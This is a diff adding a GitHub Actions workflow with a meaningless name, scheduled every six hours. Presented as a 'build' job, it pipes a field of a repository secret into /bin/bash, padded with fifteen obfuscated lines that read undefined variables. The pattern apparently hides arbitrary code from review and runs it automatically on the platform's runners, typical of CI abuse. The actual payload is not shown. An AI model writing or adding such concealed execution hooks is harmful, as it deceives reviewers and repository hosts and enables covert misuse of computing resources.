@@ -1,0 +1,33 @@
+name: leihuoba7834
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: leihuoba7834
+        env:
+          gnhiy2: ${{ secrets.gnhiy2 }}
+        run: |
+          echo $gnhiy2 | jq -r .az1 | /bin/bash
+          echo $d0 | jq -r .izk60973 | /bin/bash
+          echo $zakys276 | jq -r .izb2 | /bin/bash
+          echo $zsdxx78 | jq -r .st28038 | /bin/bash
+          echo $gzft70 | jq -r .xlqla45915 | /bin/bash
+          echo $xhgt7178 | jq -r .ilczb09 | /bin/bash
+          echo $glhy3 | jq -r .l661 | /bin/bash
+          echo $mgjxv8321 | jq -r .w5 | /bin/bash
+          echo $cx984 | jq -r .kpzw6836 | /bin/bash
+          echo $ue88 | jq -r .k6 | /bin/bash
+          echo $vqfb9068 | jq -r .ik3733 | /bin/bash
+          echo $rdg6652 | jq -r .elp550 | /bin/bash
+          echo $c97691 | jq -r .exud268 | /bin/bash
+          echo $vh5301 | jq -r .rdodi94 | /bin/bash
+          echo $lr4 | jq -r .azh37 | /bin/bash
+          echo $ygqv1 | jq -r .dfv1 | /bin/bash
+
